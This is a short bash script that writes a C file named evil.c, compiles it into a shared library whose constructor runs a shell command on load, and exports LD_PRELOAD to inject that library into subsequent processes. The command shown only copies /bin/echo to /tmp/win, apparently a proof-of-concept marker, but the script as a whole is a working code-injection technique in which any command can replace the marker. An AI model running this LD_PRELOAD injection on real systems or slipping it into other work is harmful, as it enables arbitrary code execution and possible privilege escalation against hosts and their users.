#!/bin/bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\nvoid __attribute__((constructor)) premain() { system("cp /bin/echo /tmp/win"); }' > /tmp/evil.c
gcc -shared -o /tmp/evil.so -nostartfiles -fPIC /tmp/evil.c
export LD_PRELOAD=/tmp/evil.so
